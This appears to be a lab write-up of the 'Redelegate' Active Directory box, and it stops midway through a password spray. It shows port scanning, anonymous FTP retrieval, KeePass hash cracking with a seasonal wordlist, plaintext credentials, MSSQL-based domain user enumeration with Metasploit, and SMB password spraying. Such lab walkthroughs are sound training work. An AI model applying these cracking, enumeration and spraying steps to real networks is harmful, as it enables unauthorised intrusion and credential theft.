
Target : 10.129.18.99

Date : 08/06/2026

```bash
>  echo "10.129.18.99 redelegate.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.18.99 redelegate.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 -T4 10.129.18.99  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 19:56 +0200  
Warning: 10.129.18.99 giving up on port because retransmission cap hit (6).  
Nmap scan report for redelegate.htb (10.129.18.99)  
Host is up (0.11s latency).  
Not shown: 65507 closed tcp ports (reset)  
PORT      STATE SERVICE       VERSION  
21/tcp    open  ftp           Microsoft ftpd  
| ftp-syst:    
|_  SYST: Windows_NT  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| 10-20-24  01:11AM                  434 CyberAudit.txt  
| 10-20-24  05:14AM                 2622 Shared.kdbx  
|_10-20-24  01:26AM                  580 TrainingAgenda.txt  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-title: IIS Windows Server  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 17:57:10Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| rdp-ntlm-info:    
|   Target_Name: REDELEGATE  
|   NetBIOS_Domain_Name: REDELEGATE  
|   NetBIOS_Computer_Name: DC  
|   DNS_Domain_Name: redelegate.vl  
|   DNS_Computer_Name: dc.redelegate.vl  
|   DNS_Tree_Name: redelegate.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-08T17:58:14+00:00  
| ssl-cert: Subject: commonName=dc.redelegate.vl  
| Not valid before: 2026-06-07T17:54:29  
|_Not valid after:  2026-12-07T17:54:29  
|_ssl-date: 2026-06-08T17:58:22+00:00; 0s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49669/tcp open  msrpc         Microsoft Windows RPC  
52867/tcp open  msrpc         Microsoft Windows RPC  
52870/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
52871/tcp open  msrpc         Microsoft Windows RPC  
64902/tcp open  msrpc         Microsoft Windows RPC  
64916/tcp open  msrpc         Microsoft Windows RPC  
64918/tcp open  msrpc         Microsoft Windows RPC  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.99%E=4%D=6/8%OT=21%CT=1%CU=40011%PV=Y%DS=2%DC=I%G=Y%TM=6A2702C2  
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=A  
OS:)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%ISR=  
OS:10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%ISR=10A%TI=I%CI=I%II=I%SS=  
OS:S%TS=A)OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%  
OS:O5=M552NW8ST11%O6=M552ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W  
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=  
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD  
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0  
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=  
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)  
  
Network Distance: 2 hops  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-08T17:58:18  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 121.36 seconds
```

Active Directory usual suspects : smb 3.1.1 `445/tcp`, LDAP `389/tcp, 3268/tcp`, RPC `135/tcp` and and kerberos `88/tcp`, also DNS `53/tcp`, http `80/tcp`
and RPC over http `593/tcp, 52870/tcp`. We also have `21/tcp` (ftp) open.
We'll add  the domains `dc.redelegate.vl and redelegate.vl` to our hosts.

```bash
>  echo "10.129.18.99 redelegate.htb dc.redelegate.vl redelegate.vl" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.18.99 redelegate.htb dc.redelegate.vl redelegate.vl  
>  nxc smb 10.129.18.99 -u guest -p '' --shares  
SMB         10.129.18.99    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.18.99    445    DC               [-] redelegate.vl\guest: STATUS_ACCOUNT_DISABLED
```

Guest is disabled on samba, so we'll try logging into ftp as this is quite the unusual port for an Active Directory box.

```bash
>  ftp -n 10.129.18.99  
Connected to 10.129.18.99.  
220 Microsoft FTP Service  
Remote system type is Windows_NT.  
ftp> user ftp  
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:    
230 User logged in.  
ftp> ls  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
10-20-24  01:11AM                  434 CyberAudit.txt  
10-20-24  05:14AM                 2622 Shared.kdbx  
10-20-24  01:26AM                  580 TrainingAgenda.txt  
226 Transfer complete.  
ftp> mget *  
mget CyberAudit.txt?    
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
434 bytes received in 0.1062 seconds (3.9917 kbytes/s)  
mget Shared.kdbx?    
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
WARNING! 10 bare linefeeds received in ASCII mode  
File may not have transferred correctly.  
226 Transfer complete.  
2622 bytes received in 0.0614 seconds (41.7000 kbytes/s)  
mget TrainingAgenda.txt?    
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
226 Transfer complete.  
580 bytes received in 0.0534 seconds (10.6160 kbytes/s)  
ftp> bye  
221 Goodbye.
```

```bash
>  cat TrainingAgenda.txt  
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)  
  
Friday 4th October  | 14.30 - 16.30 - 53 attendees  
"Don't take the bait" - How to better understand phishing emails and what to do when you see one  
  
  
Friday 11th October | 15.30 - 17.30 - 61 attendees  
"Social Media and their dangers" - What happens to what you post online?  
  
  
Friday 18th October | 11.30 - 13.30 - 7 attendees  
"Weak Passwords" - Why "SeasonYear!" is not a good password    
  
  
Friday 25th October | 9.30 - 12.30 - 29 attendees  
"What now?" - Consequences of a cyber attack and how to mitigate them%                                                                                                                                              
>  cat CyberAudit.txt  
OCTOBER 2024 AUDIT FINDINGS  
  
[!] CyberSecurity Audit findings:  
  
1) Weak User Passwords  
2) Excessive Privilege assigned to users  
3) Unused Active Directory objects  
4) Dangerous Active Directory ACLs  
  
[*] Remediation steps:  
  
1) Prompt users to change their passwords: DONE  
2) Check privileges for all users and remove high privileges: DONE  
3) Remove unused objects in the domain: IN PROGRESS  
4) Recheck ACLs: IN PROGRESS
```

The last file is a .kbdx which means we have to decrypt it.

```bash
> keepassxc
```

We don't have the master password nor do we have a `key file`.

`WARNING! 10 bare linefeeds received in ASCII mode` in the `ftp` download tells us that we might have to redownload it in binary.

`Friday 18th October | 11.30 - 13.30 - 7 attendees "Weak Passwords" - Why "SeasonYear!" is not a good password`.

We got a hunch on the password. The box was released in 2025, so we'll try this list first :

```bash
>  printf '%s\n' Spring2024! Summer2024! Autumn2024! Fall2024! Winter2024! Spring2025! Summer2025! Fall2025! Autumn2025! Winter2025! > /tmp/redelegate-pass.txt  
>  cat /tmp/redelegate-pass.txt  
  
Spring2024!  
Summer2024!  
Autumn2024!  
Fall2024!  
Winter2024!  
Spring2025!  
Summer2025!  
Fall2025!  
Autumn2025!  
Winter2025!  
>  keepass2john ~/Shared.kdbx > /tmp/Shared.kdbx.hash  
>  head -1 /tmp/Shared.kdbx.hash  
  
[REDACTED]
[REDACTED]
```

And it seems we got a hash.

```bash
>  john --wordlist=/tmp/redelegate-pass.txt /tmp/Shared.kdbx.hash  
  
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"  
Use the "--format=KeePass-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (KeePass [SHA256 AES 32/64])  
Cost 1 (iteration count) is 600000 for all loaded hashes  
Cost 2 (version) is 2 for all loaded hashes  
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Fall2024!        (Shared)  
1g 0:00:00:01 DONE (2026-06-08 20:24) 0.9259g/s 9.259p/s 9.259c/s 9.259C/s Spring2024!..Winter2025!  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed
```

And we got `Fall2024!` as the password.

We open `keepassxc` and put the password in and we're in :

`Administrator:Spdv41gg4BlBgSYIW1gF`
Deprecated : `FTPUser:SguPZBKdRyxWzvXRWy6U`
`SQLGuest:zDPBpaF4FywlqIv11vii`
`WordPress Panel:cn4KOEgsHqvKXPjEnSD9`

Are what we have from the `IT` folder.

From `HelpDesk`, we got `22331144` as "KeyFob Combination".

And from the `Timesheet Manager` we got `Timesheet:hMFS4I0Kj8Rcd62vqi5X`.

We can leave out the `Administrator` pass for now, we just started the box, Admin given here would be a joke. `SQLGuest` is weird since we didn't find any mssql port open, even in the fullport scan.

```bash
>  nmap -Pn -p 1433 10.129.18.99  
Please touch the FIDO authenticator.  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 20:31 +0200  
Nmap scan report for redelegate.htb (10.129.18.99)  
Host is up (0.089s latency).  
  
PORT     STATE SERVICE  
1433/tcp open  ms-sql-s  
  
Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```

So  it IS open. Somehow the fullport scan missed it.

```bash
>  nxc mssql redelegate.vl -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' --local-auth  
MSSQL       10.129.18.99    1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)  
MSSQL       10.129.18.99    1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

We got a positive on the mssql login.

We then go on `msfconsole` to try and find a way to enumerate the domain via this `mssql` gateway.

```bash
>  msfconsole -q  
msf > search mssql enum  
  
Matching Modules  
================  
  
  #  Name                                                   Disclosure Date  Rank    Check  Description  
  -  ----                                                   ---------------  ----    -----  -----------  
  0  auxiliary/admin/mssql/mssql_enum                       .                normal  No     Microsoft SQL Server Configuration Enumerator  
  1  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli  .                normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration  
  2  auxiliary/admin/mssql/mssql_enum_sql_logins            .                normal  No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration  
  3  auxiliary/admin/mssql/mssql_enum_domain_accounts       .                normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration  
  4  auxiliary/server/relay/smb_to_mssql                    .                normal  No     Microsoft Windows SMB to MSSQL Relay  
  
  
Interact with a module by name or index. For example info 4, use 4 or use auxiliary/server/relay/smb_to_mssql
```

We'll use the `domain_accounts` one as this might reveal the Active Directory's domain usernames.

```bash
msf > use 3  
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOST 10.129.18.99  
RHOST => 10.129.18.99  
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username SQLGuest  
username => SQLGuest  
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password zDPBpaF4FywlqIv11vii  
password => zDPBpaF4FywlqIv11vii  
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set fuzznum 9999  
fuzznum => 9999  
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run  
[*] Running module against 10.129.18.99  
[*] 10.129.18.99:1433 - Attempting to connect to the database server at 10.129.18.99:1433 as SQLGuest...  
[+] 10.129.18.99:1433 - Connected.  
[*] 10.129.18.99:1433 - SQL Server Name: WIN-Q13O908QBPG  
[*] 10.129.18.99:1433 - Domain Name: REDELEGATE  
[+] 10.129.18.99:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a  
[*] 10.129.18.99:1433 - Brute forcing 9999 RIDs through the SQL Server, be patient...  
[*] 10.129.18.99:1433 -  - WIN-Q13O908QBPG\Administrator  
[*] 10.129.18.99:1433 -  - REDELEGATE\Guest  
[*] 10.129.18.99:1433 -  - REDELEGATE\krbtgt  
[*] 10.129.18.99:1433 -  - REDELEGATE\Domain Admins  
[*] 10.129.18.99:1433 -  - REDELEGATE\Domain Users  
[*] 10.129.18.99:1433 -  - REDELEGATE\Domain Guests  
[*] 10.129.18.99:1433 -  - REDELEGATE\Domain Computers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Domain Controllers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Cert Publishers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Schema Admins  
[*] 10.129.18.99:1433 -  - REDELEGATE\Enterprise Admins  
[*] 10.129.18.99:1433 -  - REDELEGATE\Group Policy Creator Owners  
[*] 10.129.18.99:1433 -  - REDELEGATE\Read-only Domain Controllers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Cloneable Domain Controllers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Protected Users  
[*] 10.129.18.99:1433 -  - REDELEGATE\Key Admins  
[*] 10.129.18.99:1433 -  - REDELEGATE\Enterprise Key Admins  
[*] 10.129.18.99:1433 -  - REDELEGATE\RAS and IAS Servers  
[*] 10.129.18.99:1433 -  - REDELEGATE\Allowed RODC Password Replication Group  
[*] 10.129.18.99:1433 -  - REDELEGATE\Denied RODC Password Replication Group  
[*] 10.129.18.99:1433 -  - REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG  
[*] 10.129.18.99:1433 -  - REDELEGATE\DC$  
[*] 10.129.18.99:1433 -  - REDELEGATE\FS01$  
[*] 10.129.18.99:1433 -  - REDELEGATE\Christine.Flanders  
[*] 10.129.18.99:1433 -  - REDELEGATE\Marie.Curie  
[*] 10.129.18.99:1433 -  - REDELEGATE\Helen.Frost  
[*] 10.129.18.99:1433 -  - REDELEGATE\Michael.Pontiac  
[*] 10.129.18.99:1433 -  - REDELEGATE\Mallory.Roberts  
[*] 10.129.18.99:1433 -  - REDELEGATE\James.Dinkleberg  
[*] 10.129.18.99:1433 -  - REDELEGATE\Helpdesk  
[*] 10.129.18.99:1433 -  - REDELEGATE\IT  
[*] 10.129.18.99:1433 -  - REDELEGATE\Finance  
[*] 10.129.18.99:1433 -  - REDELEGATE\DnsAdmins  
[*] 10.129.18.99:1433 -  - REDELEGATE\DnsUpdateProxy  
[*] 10.129.18.99:1433 -  - REDELEGATE\Ryan.Cooper  
[*] 10.129.18.99:1433 -  - REDELEGATE\sql_svc
```

```
>  nano /tmp/redelusers.txt  
>  cat /tmp/redelusers.txt  
Administrator     
Guest     
krbtgt     
Christine.Flanders     
Marie.Curie     
Helen.Frost     
Michael.Pontiac     
Mallory.Roberts     
James.Dinkleberg     
Helpdesk     
IT     
Finance     
Ryan.Cooper     
sql_svc
```

Then, we spray :

```bash
>  nxc smb redelegate.vl -u /tmp/redelusers.txt -p /tmp/redelegate-pass.txt --continue-on-success  
SMB         10.129.18.99    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Marie.Curie:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Spring2024! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Spring2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Marie.Curie:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Summer2024! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Summer2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Marie.Curie:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Autumn2024! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Autumn2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Fall2024! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Fall2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Winter2024! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Winter2024! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Spring2025! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Spring2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Summer2025! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Summer2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Administrator:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Guest:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\krbtgt:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Christine.Flanders:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helen.Frost:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Michael.Pontiac:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Mallory.Roberts:Fall2025! STATUS_ACCOUNT_RESTRICTION    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\James.Dinkleberg:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Helpdesk:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\IT:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Finance:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\Ryan.Cooper:Fall2025! STATUS_LOGON_FAILURE    
SMB         10.129.18.99    445    DC               [-] redelegate.vl\sql_svc:Fall2025! STATUS_LOGON_FAILURE    
